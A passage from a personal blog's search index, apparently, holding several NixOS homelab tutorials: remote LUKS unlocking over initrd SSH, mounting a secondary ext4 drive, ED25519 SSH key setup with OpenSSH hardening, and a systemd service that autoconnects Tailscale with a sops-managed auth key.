\u0026#39;\u0026#39;command=\u0026#34;systemctl start unlock-luks.service\u0026#34; YOUR-SSH-KEY-HERE\u0026#39;\u0026#39; ]; # Location of the SSH host key hostKeys = [ \u0026#34;/etc/ssh/initrd_ssh_host_ed25519_key\u0026#34; ]; }; }; }; Understanding Each Part in Detail: Basic Structure (boot.initrd):\nThis is where we configure what happens during the early boot process The \u0026ldquo;initrd\u0026rdquo; is like a mini operating system that runs before your main system starts It\u0026rsquo;s responsible for getting your encrypted drive unlocked and ready Systemd Configuration (systemd = { ... }):\nSystemd is the system manager that coordinates various services We\u0026rsquo;re telling it to: Be active during early boot (enable = true) Have the necessary tools available (initrdBin) Set up networking Create a service for unlocking the drive Network Setup (network = { ... }):\nUses systemd\u0026rsquo;s built-in network manager Configures your specific network card (replace \u0026ldquo;enp6s18\u0026rdquo; with your interface name) Enables DHCP to automatically get an IP address This ensures you can connect to your system over the network before it\u0026rsquo;s fully booted The Unlock Service (services.unlock-luks):\nThis is the service that actually unlocks your encrypted drive It has several important parts: wantedBy = [ \u0026quot;initrd.target\u0026quot; ] - Makes sure it runs during boot after/before - Controls when exactly it runs serviceConfig - How the service should behave script - The actual commands to unlock the drive SSH Configuration (network.ssh):\nSets up secure remote access during early boot Uses port 2222 instead of the default 22 for better security The command=\u0026quot;...\u0026quot; prefix restricts what SSH users can do Only allows running the unlock service, nothing else Security Features:\nNon-standard SSH port (2222) Restricted commands through SSH Dedicated SSH host key for the early boot environment Service dependencies ensure proper ordering Error Handling:\nSuccessExitStatus = [ 0 1 ] - Accepts both successful outcomes || true at the end of the unlock command prevents fatal errors RemainAfterExit = true keeps track of the service state This configuration creates a secure way to remotely unlock your encrypted drive while ensuring that:\nOnly authorized users can connect authorizedKeys The network is properly configured first Using systemd\u0026rsquo;s built in network manager. The unlock process happens at exactly the right time during boot befor/after Failed attempts won\u0026rsquo;t break the boot process SuccessExitStatus = [ 0 1 ] Step 5: Configure Your Boot Loader: As discussed, the bootloader is the first program that runs when the computer starts \u0026amp; it\u0026rsquo;s responsible for loading the Linux kernel and initrd (initial ram disk), we need to add some additional configuration mainly for security reason.\nCurrently your bootloader configuration will look like this image\nWe are going to replace the above with the below, it is mostly the same however we are specifying how many configurations are available 10 and explicitly disabling the editor so users cannot drop into a root shell.\n#Bootloader configuration boot.loader = { systemd-boot = { enable = true; configurationLimit = 10; editor = false; # Disable editing boot entries for security }; efi.canTouchEfiVariables = true; # Usually true for most systems }; Understanding this configuration:\nsystemd-boot.enable = true activates this lightweight, modern bootloader configurationLimit = 10 keeps your boot menu clean by limiting stored configurations editor = false prevents attackers from bypassing security via boot parameters efi.canTouchEfiVariables = true allows NixOS to update boot entries (set to false for systems with problematic UEFI) Step 6: Rebuild Your System: After making these changes, rebuild your NixOS configuration:\nsudo nixos-rebuild switch Step 7: Test Remote Decryption: Now you can test your setup:\nReboot your system:\nsudo reboot From another machine, SSH into your system during early boot:\nssh -p 2222 root@your-system-ip +Note+: I would allow 30 seconds from the reboot signal being sent to try and SSH in, as you have to wait for the initial boot and NixOS version screen to pass. You should be prompted to enter the LUKS passphrase\nAfter entering the correct passphrase, the boot process will continue\nIf everything is set up correctly, the server will finish booting after you provide the passphrase and you can access it via ssh.\nTroubleshooting If you encounter issues check the below troubleshooting steps.\nCan\u0026rsquo;t connect via SSH during early boot Verify your network settings are correct Check if the SSH port is open (no firewall blocking it) nmap -p 2222 [ipOfHost] Ensure your network hardware is supported in the initrd System doesn\u0026rsquo;t continue booting after entering the passphrase Check for errors in your LUKS configuration Verify the disk path is correct Try running the cryptsetup command manually during the SSH session SSH host key warnings This is expected when connecting, as you\u0026rsquo;re using different host keys You can add the initrd host key to your known_hosts file or use: ssh -p 2222 -o StrictHostKeyChecking=no root@your-system-ip Systemd Service Issues Check service status: systemctl status unlock-luks View service logs: journalctl -u unlock-luks Verify service dependencies: systemctl list-dependencies unlock-luks Last resort revert to previous hardware configuration: Remember we made a copy of hardware-configuration.nix well you can just revert back to using this. rm hardware-configuration.nix mv hardware-configuration.nix.bak hardware-configuration.nix sudo nixos-rebuild switch sudo reboot now Conclusion/Next Time: You now have a NixOS system that can be remotely unlocked after rebooting, eliminating the need for physical access or console access through Proxmox. This setup is particularly useful for homelab environments where systems might need occasional reboots but aren\u0026rsquo;t easily physically accessible.\nRemember that while this setup provides convenience, it does have security implications. The SSH host keys for the initrd are stored unencrypted, which could be a vulnerability if an attacker gains physical access to your system.\nIn the next post we will move onto installing packages and setting up docker.\nSign-off: As always hack the planet homelab!\n", 
        "url": "http:\/\/localhost:1313\/homelab\/20250280118-nixos-homelab-4\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/20250280118-nixos-homelab-3\/": {
        "title": "Rebuilding My Homelab In NixOS (Part 3) Mounting A Secondary Drive At Boot",
        "tags": ["docker","nixos","homelab","system","configuration",],
        "content": "This is part 3 of my series demonstrating my rebuild of my homelab in NixOS.\nInitial creation of the NixOSVM on Proxmox Part 1 . Enabling SSH access on NixOS Part 2 . Mounting a secondary drive on NixOS Part 3 . (This Part) Decrypting boot early with initrd-ssh Part 4 . Installing Docker on NixOS Part 5 Mounting A Second Drive In NixOS: So far we have built our VM, installed NixOS and configured it for SSH authentication. We still have a little more basic configuration to do before we can progress further. We need to mount the secondary drive, luckily this is a quick process and NixOS has a handy tool that helps us make this mount permanent and it doesn\u0026rsquo;t involve manually configuring fstab for change!\nListing Drives In NixOS: If you have setup the drive as per the guidance in part one if you run lsblk you should see something similar to the below, primary drive mounted at sda1 and then a secondary data drive sdb unmounted.\n[martin@nixos:~]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS sda 8:0 0 32G 0 disk └─sda1 8:1 0 32G 0 part └─luks-37b6f582-27a6-4e93-87ff-1a477dba2a77 254:0 0 32G 0 crypt /nix/store / sdb 8:16 0 40G 0 disk sr0 11:0 1 2.4G 0 rom As we can see the drive is just listed as disk and is currently not formatted, so we will need to format it.\nFormatting Our Drive: Before we can do anything we will need to format the drive to the EXT4 file system.\nPrepare The Drive Using fdisk: Drop into the fdisk prompt:\nsudo fdisk /dev/sdb Create a primary partition:\nType \u0026ldquo;p\u0026rdquo; to select primary partition [martin@nixos:~]$ sudo fdisk /dev/sdb Welcome to fdisk (util-linux 2.39.4). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Device does not contain a recognized partition table. Created a new DOS (MBR) disklabel with disk identifier 0x0cef112a. Command (m for help): p #This is me typing \u0026#34;p\u0026#34; her and pressing ENTER Disk /dev/sdb: 40 GiB, 42949672960 bytes, 83886080 sectors Disk model: QEMU HARDDISK Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x0cef112a Write our changes using fdisk:\nWe need to write the changes we have just made. Command (m for help): w The partition table has been altered. Calling ioctl() to re-read partition table. Syncing disks. Creating the ext4 file system using mkfs? We now need to create the filesystem we want on the drive, which in this case ext4, you will be prompted to proceed anyway just click y and press enter.\n[martin@nixos:~]$ sudo mkfs.ext4 /dev/sdb mke2fs 1.47.1 (20-May-2024) Found a dos partition table in /dev/sdb Proceed anyway? (y,N) y Discarding device blocks: done Creating filesystem with 10485760 4k blocks and 2621440 inodes Filesystem UUID: 211c9f9e-cb14-4ce4-9cf3-dbbc26692fc9 Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000, 7962624 Allocating group tables: done Writing inode tables: done Creating journal (65536 blocks): done Writing superblocks and filesystem accounting information: done Why Choose ext4? ext4 is a robust, widely-used Linux filesystem that offers good performance and stability. For a homelab environment, it\u0026rsquo;s often an excellent default choice due to its reliability and broad support across Linux distributions. Other options you might consider:\nbtrfs: Offers advanced features like snapshots and compression, but can be more complex to manage xfs: Good for large files and high-performance workloads zfs: Powerful features like snapshots, compression, and data integrity, but requires more resources For our Docker data, ext4 provides a good balance of performance, stability, and simplicity.\nMounting The Drive In NixOS: So we have our lovely formatted drive, however but in order to use it we will need to mount it.\nCreate the Mount Point: We need somewhere to mount the drive so let\u0026rsquo;s create a mount point. sudo mkdir -p /mnt/docker Now We Mount The drive: We run the below command to mount the drive.\nsudo mount /dev/sdb /mnt/docker Check ensure it\u0026rsquo;s mounted and we can see on the right hand side that sdb is mounted at /mnt/docker [martin@nixos:~]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS sda 8:0 0 32G 0 disk └─sda1 8:1 0 32G 0 part └─luks-37b6f582-27a6-4e93-87ff-1a477dba2a77 254:0 0 32G 0 crypt /nix/store / sdb 8:16 0 40G 0 disk /mnt/docker sr0 11:0 1 2.4G 0 rom Setting Proper Permissions On Our Newly Mounted Drive: After mounting the drive, you will want to set appropriate ownership and permissions:\nUnderstanding default permissions:\nThe default permissions for a freshly formatted ext4 filesystem are: Root directory owned by root:root Permissions set to 755 (rwxr-xr-x) You can check current permissions with: [martin@nixos:~]$ ls -la /mnt/docker total 24 drwxr-xr-x 3 root root 4096 Feb 28 07:56 . drwxr-xr-x 3 root root 4096 Feb 28 07:44 .. drwx------ 2 root root 16384 Feb 28 07:56 lost+found Set ownership to your user account to avoid permission issues when working with files:\nsudo chown -R yourusername:users /mnt/docker # For example: sudo chown -R martin:users /mnt/docker +Note+: In NixOS, unlike some other Linux distributions, user groups need to be explicitly defined in your configuration. By default, a NixOS user doesn\u0026rsquo;t automatically get a group with the same name so instead of it being martin:martin it\u0026rsquo;s martin:users. Re-check permissions:\n[martin@nixos:~]$ ls -la /mnt/docker total 24 drwxr-xr-x 3 martin users 4096 Feb 28 07:56 . drwxr-xr-x 3 root root 4096 Feb 28 07:44 .. drwx------ 2 martin users 16384 Feb 28 07:56 lost+found As we can see our user now has the appropriate permissions.\n+Note+: For a Docker data directory, appropriate permissions are essential to allow Docker to create and manage container volumes without permission errors.\nModifying hardware-configuration.nix To Make This Mount Persistent: Traditionally in Linux if we want a mounted file system to mount at boot we would need to manually change fstab etc, however NixOS makes this a lot more convenient. NixOS has a file called hardware-configuration.nix that is stored under /etc/nixos this contains, you guessed it, hardware configurations for the host system.\nIf we examine this file now, we can see it currently holds various boot information as well kernel modules, DHCP information as well as our file-system information. Below is an image of mine currently, before we make the changes to mount the docker drive permanganate.\nWe can use a handy tool nixos-generate-config to make this mount persistent, so lets do that.\n[martin@nixos:~]$ sudo nixos-generate-config [sudo] password for martin: writing /etc/nixos/hardware-configuration.nix... warning: not overwriting existing /etc/nixos/configuration.nix +Note+: The great thing is, it won\u0026rsquo;t overwrite our existing configuration.nix Now if we recheck the hardware-configuration.nix file we can see it\u0026rsquo;s added an entry for our newly created filesystem and it will now be mounted at boot.\nRebuilding The System: For these changes to take affect we need to rebuild the system, we run the below: sudo nixos-rebuild switch Understanding The Configuration: Let\u0026rsquo;s take a closer look at what NixOS added to the hardware-configuration.nix file:\nfileSystems.\u0026#34;/mnt/docker\u0026#34; = { device = \u0026#34;/dev/disk/by-uuid/YOUR-UUID-HERE\u0026#34;; # Uses UUID for reliable identification fsType = \u0026#34;ext4\u0026#34;; # Filesystem type options = [ \u0026#34;defaults\u0026#34; ]; # Mount options }; Some key points to understand:\nThe configuration uses a UUID-based device path rather than /dev/sdb This is a crucial difference from traditional Linux systems where you might directly reference device names in /etc/fstab Even though this is different from traditional Linux, we can still pass the same additional arguments for example. options = [ \u0026#34;defaults\u0026#34; \u0026#34;noatime\u0026#34; \u0026#34;nofail\u0026#34; ]; # - noatime: improves performance by preventing access time updates # - nofail: system will boot even if this drive fails to mount Why UUID-based Mounting Is Important: NixOS uses UUIDs /dev/disk/by-uuid/.. rather than device names /dev/sdb in the configuration for reliability. Here\u0026rsquo;s why this matters:\nDevice names can change between reboots (a drive that\u0026rsquo;s /dev/sdb today might become /dev/sdc after adding another drive) UUIDs are unique identifiers that remain consistent regardless of where the drive is connected This makes your system more robust to hardware changes To find the UUID of your drive manually, you can use:\nsudo blkid /dev/sdb The UUID in the hardware-configuration.nix file should match what\u0026rsquo;s shown in this command\u0026rsquo;s output. For example we can see it matches here: Verifying Your Setup: After rebooting, verify that your drive mounts properly:\n# Reboot your system sudo reboot # After logging back in, check that the drive is mounted lsblk -f # Check available space df -h /mnt/docker # Verify you can write to the drive (if permissions are set correctly) touch /mnt/docker/test_file +Important+: Remember if you have configured an encrypted drive you will need to enter the password from the Proxmox console before you can get access again VIA SSH (luckily we will address this annoyance in the next part of this series) Next time: This post is already long so next time we will configure an ssh server in initrd as a way to easily enter our LUKS password on boot so we don\u0026rsquo;t have to have physical access or access to the Proxmox console. Sign-off: As always hack the planet homelab!\n", 
        "url": "http:\/\/localhost:1313\/homelab\/20250280118-nixos-homelab-3\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/20250220118-nixos-homelab-2\/": {
        "title": "Rebuilding My Homelab In NixOS (Part 2) Enabling SSH Login in NixOS",
        "tags": ["docker","nixos","homelab","system","configuration",],
        "content": "This is part 2 of my series demonstrating my rebuild of my homelab in NixOS.\nInitial creation of the NixOSVM on Proxmox Part 1 . Enabling SSH access on NixOS Part 2 . (This Part) Mounting a secondary drive on NixOS Part 3 . Decrypting boot early with initrd-ssh Part 4 . Installing Docker on NixOS Part 5 First Login to NixOS: Lets start off where we left off in the last section, and we will login to the NixOS host for the first time.\nAs we are using Proxmox our first login will be via using the console, use the credentials you provided in the VM creation.\nMaking Login Easier: As we don\u0026rsquo;t want to keep using the console in Proxmox we should add our ssh key so we can login. If you don\u0026rsquo;t have an ssh key I would recommend you follow this handy guide below, if you do please skip ahead to Enabling SSH Login On NixOS: Creating An SSH Key: SSH key authentication provides a more secure way to log into your servers compared to password-based authentication. This guide walks you through creating an ED25519 SSH key pair on your local machine - a modern, secure, and efficient choice for today\u0026rsquo;s authentication needs.\n+Note+: This assumes your on linux.\nStep 1: Generate An ED25519 SSH Key Pair The first step is to create an SSH key pair using the ssh-keygen utility. While the default is RSA, we\u0026rsquo;ll specifically generate an ED25519 key, which offers superior security, performance, and smaller key sizes.\nRun this command in your terminal:\nssh-keygen -t ed25519 You\u0026rsquo;ll see output similar to:\nGenerating public/private ed25519 key pair. Enter file in which to save the key (/home/username/.ssh/id_ed25519): Step 2: Choose A Location For Your Keys The system will prompt you to select a location for storing your keys. By default, ED25519 SSH keys are stored in the ~/.ssh/ directory in your home folder:\nThe private key will be named id_ed25519 The public key will be named id_ed25519.pub Recommendation: Press ENTER to accept the default location. This allows your SSH client to automatically find your keys when authenticating.\nIf you\u0026rsquo;ve previously generated ED25519 keys, you might see this warning:\n/home/username/.ssh/id_ed25519 already exists. Overwrite (y/n)? +CAUTION+: If you choose to overwrite existing keys, you won\u0026rsquo;t be able to use the previous keys for authentication. This action cannot be reversed!\nStep 3: Set A Passphrase (Recommended) Next, you\u0026rsquo;ll be prompted to create a passphrase:\nEnter passphrase (empty for no passphrase): Enter same passphrase again: Why Use a Passphrase?\nA passphrase adds an important layer of security to your key-based authentication:\nProtects your private key if your local machine is compromised Ensures that possession of the key file alone isn\u0026rsquo;t enough to gain access Prevents immediate unauthorized access if someone gains access to your computer Creates a two-factor authentication effect: something you have (the key) and something you know (the passphrase) While optional, setting a strong passphrase is highly recommended. If you prefer not to use one, simply press ENTER to continue.\nStep 4: Key Generation Complete After successful generation, you\u0026rsquo;ll see output similar to:\nYour identification has been saved in /home/username/.ssh/id_ed25519. Your public key has been saved in /home/username/.ssh/id_ed25519.pub. The key fingerprint is: SHA256:naOuGUXEH9q5WDjVJRVl8g5VRvGFJCY4lj75mQYJ6vY username@hostname The key\u0026#39;s randomart image is: +--[ED25519 256]--+ | . .... | | o + .o . | |. = + .. . | | o = o o . | |. o = o.S o | |.+ o +.= + | |o.+ + +.= . | |.o + = .o.E | |+ . . .+o. | +----[SHA256]-----+ Congratulations! You now have a public and private ED25519 key pair. We now need to get this onto the host.\nTo view your public key for copying to a server, you can use:\ncat ~/.ssh/id_ed25519.pub Why ED25519?\nED25519 keys offer several advantages over the older RSA keys:\nSuperior security: Uses modern elliptic curve cryptography Better performance: Faster operations for both key generation and authentication Smaller key size: Dramatically shorter keys (256 bits vs 3072+ bits for RSA) with equal or better security Resistant to side-channel attacks: More robust against certain types of cryptographic attacks Wide adoption: Supported by all modern SSH implementations (OpenSSH 6.5+) The only reason to choose RSA instead would be for compatibility with very old systems that don\u0026rsquo;t support ED25519, but luckily we don\u0026rsquo;t need to worry about that.\nAdditional Resources: OpenSSH Official Website ssh-keygen Manual Page Understanding SSH Key Authentication Flow: Before we configure SSH on our NixOS system, let\u0026rsquo;s understand how the SSH key authentication process works:\n┌────────────────┐ ┌──────────────────┐ │ │ │ │ │ Your Machine │ │ NixOS Server │ │ │ │ │ └────────┬───────┘ └────────┬─────────┘ │ │ │ 1. Initiate SSH Connection │ │───────────────────────────────────────►│ │ │ │ 2. Send Server\u0026#39;s Public Key │ │◄───────────────────────────────────────│ │ │ │ 3. Verify Server\u0026#39;s Identity │ │ (First-time: Add to known_hosts) │ │ │ │ 4. Server Requests Authentication │ │◄───────────────────────────────────────│ │ │ │ 5. Client Sends \u0026#34;I want to use key\u0026#34; │ │───────────────────────────────────────►│ │ │ │ 6. Server Checks authorized_keys │ │ for Client\u0026#39;s Public Key │ │ │ │ 7. Server Sends Encrypted Challenge │ │ (Encrypted with Client\u0026#39;s Public Key)│ │◄───────────────────────────────────────│ │ │ │ 8. Client Decrypts Challenge │ │ with Private Key │ │ │ │ 9. Client Sends Signed Response │ │───────────────────────────────────────►│ │ │ │ 10. Server Verifies Response │ │ with Client\u0026#39;s Public Key │ │ │ │ 11. Authentication Success! │ │◄───────────────────────────────────────│ │ │ │ 12. Encrypted SSH Session Established │ │◄═══════════════════════════════════════╡ │ │ ┌────────┴───────┐ ┌────────┴─────────┐ │ │ │ │ │ Your Machine │ │ NixOS Server │ │ │ │ │ └────────────────┘ └──────────────────┘ The beauty of this process is that:\nYour private key never leaves your local machine Password-less, yet highly secure authentication The server verifies your identity cryptographically The entire session is encrypted after authentication This is why we will set up SSH key authentication and disable password authentication - it\u0026rsquo;s both more convenient and more secure!\nEnabling SSH Login On NixOS: Now that you have your handy ssh key we need to copy it to the host and enable ssh login. To do this we need to edit the configuration.nix file, To do this type.\nnano /etc/nixos/configuration.nix +Note+: For this project we will do all our editing in the configuration.nix file. Looking at the configuration.nix file for the first time can be overwhelming so we will make small changes as and when we need them. The first step is to get SSH enabled.\nScroll down until you see the below lines.\n# Enable the OpenSSH daemon. # services.openssh.enable = true; We need to un-comment the second line and remove the hashtag so it reads, this way when we rebuild the SSH daemon will be enabled and we can login via ssh.\n# Enable the OpenSSH daemon. services.openssh.enable = true; Press CTRL + X to exit, you will be prompted to save type Y and then hit ENTER\nBaby\u0026rsquo;s First Rebuild: Now we have made these changes we need to rebuild the system so the changes are reflected type the below command.\nsudo nixos-rebuild switch +Note+: You are going to get a lot of output here, this is just Nix rebuilding the system, downloading and enabling relevant packages \u0026amp; enabling the ssh service.\nUnderstanding the NixOS Rebuild Process: For those new to NixOS, the nixos-rebuild command is central to how the system works. Here\u0026rsquo;s what happens when you run it:\nConfiguration Evaluation: NixOS reads your configuration.nix file(s) and evaluates them to determine the desired system state.\nDependency Resolution: It calculates what packages and services need to be installed, upgraded, or configured based on changes to your configuration.\nBuild Phase:\nNew packages are downloaded from binary caches (if available) or built from source System configuration files are generated Each package is stored in the Nix store with a unique hash-based path Activation Phase:\nNew system files are linked into place Services are started, restarted, or stopped as needed A new \u0026ldquo;generation\u0026rdquo; is created, allowing you to roll back if needed Switch Action: The switch argument tells NixOS to immediately activate the new configuration (alternatives include test and boot)\nThis declarative approach ensures your system always matches exactly what\u0026rsquo;s in your configuration files - a key advantage of NixOS. Each rebuild creates a new system generation that you can roll back to from the boot menu if anything goes wrong.\nLogin To The System VIA SSH \u0026amp; Password: Lets grab the IP of our VM by running the below command.\nip addr We can see the IP address of this host is 192.168.2.25, yours will be different!\nLets go to our terminal and login:\nssh [yourusername]@[yourNixOSBoxIP] # Example ssh martin@192.168.2.25 As we can see we are prompted for our password, which at this moment is fine as we have not added our ssh key to the host.\nAdding Your SSH Key To NixOS: As we want to use our ssh keys we will now add our public key to the host \u0026amp; disable password authentication, we do this for security.\nOpen configuration.nix:\nsudo nano /etc/nixos/configuration.nix Find the users section:\nScroll down until you see the section below (note it will have your username not \u0026ldquo;martin\u0026rdquo;) # Define a user account. Don\u0026#39;t forget to set a password with \u0026#39;passwd\u0026#39;. users.users.martin = { isNormalUser = true; description = \u0026#34;martin\u0026#34;; extraGroups = [ \u0026#34;networkmanager\u0026#34; \u0026#34;wheel\u0026#34; ]; packages = with pkgs; []; }; Get your public SSH key:\nWe are going to add our ssh public key to this file so first we need to get the contents, on the host where you generated the key type the following. cat ~/.ssh/id_ed25519.pub Add your public SSH key:\nAdd the following line (adding your SSH key to the system) under the users section. # Define a user account. Don\u0026#39;t forget to set a password with \u0026#39;passwd\u0026#39;. users.users.martin = { isNormalUser = true; description = \u0026#34;martin\u0026#34;; extraGroups = [ \u0026#34;networkmanager\u0026#34; \u0026#34;wheel\u0026#34; ]; packages = with pkgs; []; }; # Add this here users.users.martin.openssh.authorizedKeys.keys = [ \u0026#34;ssh-ed25519 YourActualSSHKEY\u0026#34; ]; Here is how mines looks: Disable Password Authentication and Root Login:\nTo do this lets find the original open ssh service line and we will modify it, it will look like the below.\n# Enable the OpenSSH daemon. services.openssh.enable = true; Replace it with the below:\n# SSH Server settings services.openssh = { enable = true; settings = { # Disable password authentication PasswordAuthentication = false; # Disable root login PermitRootLogin = \u0026#34;no\u0026#34;; # Only use SSH protocol version 2 Protocol = 2; }; }; Save and rebuild NixOS:\nAfter making these changes, save the file and rebuild your NixOS configuration: sudo nixos-rebuild switch Test your SSH connection:\nBefore closing your current session, open a new terminal and test that you can log in with your SSH key: ssh username@your-nixos-ip If successful, you should be able to log in without entering a password This post has went on long enough in the next part we will start to install packages.\nSignoff: As always hack the planet homelab!\n", 
        "url": "http:\/\/localhost:1313\/homelab\/20250220118-nixos-homelab-2\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/": {
        "title": "Autostart Tailscale on NixOS system boot \u0026 rebuild",
        "tags": ["nixos","tailscale","homelab","networking","vpn","system","configuration",],
        "content": "Are you tired of running sudo tailscale up every time you login, I know I am. So I thought why spend under two seconds waiting for something to run and using auto complete with ZSH to easily find the command when I can easily create a service that launches Tailscale on boot for me and re-launches on every rebuild of the system.\nThis configuration will ensure that:\nTailscale starts automatically with your system. You don\u0026rsquo;t need to manually authenticate each time. Your authentication key is stored securely using sops /sops-nix The connection is established only when needed (won\u0026rsquo;t try to reconnect if already connected). This assumes you already have a Tailscale account and sops setup, if you don\u0026rsquo;t please see guides below.\nTailscale quick start guide Install sops-nix Generating The Tailscale Auth Key: As we want to automate the process of authenticating of connecting our NixOS host to the Tailscale network we will need to generate an auth key. This will mean we do not have to follow the provided Tailscale links when adding the host to the network or re-authorizing. +Note+: Even if you have already added your host to the Tailscale network this process is still the same. Login to your account and click \u0026ldquo;Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Personal Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Keys\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Generate Auth Key\u0026rdquo;\nKey settings, give your key a memorable name and also set it for the amount of time you want it to be valid for, I have set it for the max 90 days have added a reminder to my todo list to regenerate one in 85 days.\nYou should now have a Tailscale auth key.\nAdding Tailscale Auth Key To Sops: It\u0026rsquo;s now time to add our Tailscale Auth Key to sops so our system has access to it.\n# If your sops file is called something different obviously you need to enter that... sops secrets.yaml # Store it in this format is important as we will be calling it later as a variable tailscale_preauth: | TAILSCALE_AUTH_KEY=tskey-auth-xxxxx-xxxxxxxxxxxxx +Note+: It is also possible to use age for this however I personally use stops as it also allows integration with home-manager. Edit your configuration.nix and add the secret so it\u0026rsquo;s accessible by other services.\nsops = { defaultSopsFile = ./packages/sops/secrets.yaml; age.keyFile = \u0026#34;/home/martin/.config/sops/age/keys.txt\u0026#34;; # I have other sops secerts here but have removed for brevity secrets.tailscale_preauth = { }; }; +Important+: The part secrets.tailscale_preauth has to match name that was placed into the sops secrets.yaml as this is the key for the value referenced. So if in your sops secrets file you called it ts-key you would write secrets.ts-key +Note+: This has to be done in configuration.nix \u0026amp; not home-manager as this is a system wide service that is running and not a user specific service. Creating The Tailscale Service: Edit your NixOS configuration.nix and add the below service. # Add tailscale to your system packages environment.systemPackages = [ pkgs.tailscale ]; # Enable the tailscale service services.tailscale.enable = true; # Create a oneshot to autoconnect on rebuild/switch systemd.services.tailscale-autoconnect = { description = \u0026#34;Automatic connection to Tailscale\u0026#34;; after = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wants = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wantedBy = [ \u0026#34;multi-user.target\u0026#34; ]; serviceConfig = { Type = \u0026#34;oneshot\u0026#34;; # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; }; # have the job run this shell script script = with pkgs; \u0026#39;\u0026#39; # wait for tailscaled to settle sleep 2 # check if we are already authenticated to tailscale status=\u0026#34;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026#34; if [ $status = \u0026#34;Running\u0026#34; ]; then # if so, then do nothing exit 0 fi # otherwise authenticate with tailscale using the key from secrets ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --accept-routes=true \u0026#39;\u0026#39;; }; +Important+: As stated before if you have called your Tailscale Auth key in your secrets file something other than tailscale_preauth you will then have to modify the line below. # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; Breaking Down The Configuration: Let\u0026rsquo;s break down what each part of this configuration does:\nSystem Package and Service Setup:\nenvironment.systemPackages = [ pkgs.tailscale ] adds the Tailscale package to your system services.tailscale.enable = true enables the Tailscale daemon service Automatic Connection Service: The systemd.services.tailscale-autoconnect section creates a systemd service that:\nRuns once during system startup (Type = \u0026quot;oneshot\u0026quot;) Starts after networking and the Tailscale daemon are ready Loads your authentication key from the sops-encrypted file ${tailscale}/bin/tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true Connection Script Logic: The script section:\nWaits 2 seconds for the Tailscale daemon to fully start Checks if you\u0026rsquo;re already connected to Tailscale by querying its status If already connected (Running state), exits without doing anything If not connected, authenticates using your stored auth key Enables route acceptance with --accept-routes=true +Note+: I also use some of my nodes as routers within my home network to allow access to other hosts so I also pass the --accept-routes=true argument, however if you don\u0026rsquo;t do this you can omit this argument. Rebuilding The System: That\u0026rsquo;s it now run either:\nsudo nixos-rebuild switch flake [location/of/flake] sudo nixos-rebuild switch Check Tailscale is running \u0026amp; connected\n", 
        "url": "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/"
    },
    
    "http:\/\/localhost:1313\/tags\/tailscale\/": {
        "title": "Tailscale",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/tailscale\/"
    },
    
    "http:\/\/localhost:1313\/tags\/vpn\/": {
        "title": "Vpn",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/vpn\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/20250220118-nixos-homelab\/": {
        "title": "Rebuilding My Homelab In NixOS (Part 1) Creating the NixOS VM In Proxmox",
        "tags": ["docker","nixos","homelab","system","configuration",],
        "content": "This is part 1 of my series demonstrating my rebuild of my homelab in NixOS.\nInitial creation of the NixOSVM on Proxmox Part 1 . (this part) Enabling SSH access on NixOS Part 2 . Mounting a secondary drive on NixOS Part 3 . Decrypting boot early with initrd-ssh Part 4 . Installing Docker on NixOS Part 5 The Catalyst: I have stepped away from doing writeups for a little while, purely due to wanting to mix things up and the fact that I was just grinding for a year prior to get my CPTS certification; I actually have a number of writeups for active boxes written just not on the site due to the terms and conditions by HTB. And as I needed something else to spend my time with I created a Proxmox cluster using two nodes (I know I know you need 3 nodes for it actually be a cluster) \u0026amp; also set up a Proxmox backup server. However that took all of an hour to do, honestly, it was one of the easiest setups I have ever done (I will create a writeup for this soon enough.)\nAs the Proxmox cluster setup was painless I needed another project. I decided to migrate my containers from Truenas Scale to a Virtual Machine in the Proxmox cluster, with a separate drive being mounted to the VM to host all the docker data. The reason being is that although I like Truenas Scale \u0026amp; their apps I don\u0026rsquo;t like the fact that I have to configure things with a GUI. I want to be able to create a docker compose.yml file with all the services I want to run and simply run docker compose up -d. This approach means that I can also commit the compose.yml to git for version control and if I ever need to rebuild, I can just spin up another VM, git-clone the repo \u0026amp; re-mount the data drive. This also means I can have the data drive backed up with the Proxmox backup server. Another primary driver for this approach has been due to me working more with Ansible \u0026amp; Docker at my workplace as means to create reproducible builds.\nSo I did this, created the Ubuntu VM \u0026amp; additional drive in Proxmox, installed docker \u0026amp; docker compose, wrote the compose.yml, transferred the existing docker data from Truenas scale, and everything was working perfectly. I had my media server, reverse proxy etc and things were ticking over nicely for all of an hour\u0026hellip;until I heard the voice \u0026ldquo;NixOS\u0026hellip;..join us for truly reproducible builds and version controlled configuration files\u0026rdquo; thus began my journey with NixOS. Because why use continue to use a perfectly working system when I can switch to a new distro/OS (where it turns out even though I have been working with arch as my daily driver for years I will have a STEEP learning cure) and struggle to get things running.\nWhy NixOS: Reason 1: Single Source of Truth: Initially I was drawn to the idea of having a single configuration file, that was a single source of truth. If you wanted to change something about your system you just modified a single file and rebuilt the host, simple. Now, that is and is not kind of true. You can 100% do that with a configuration.nix stored in 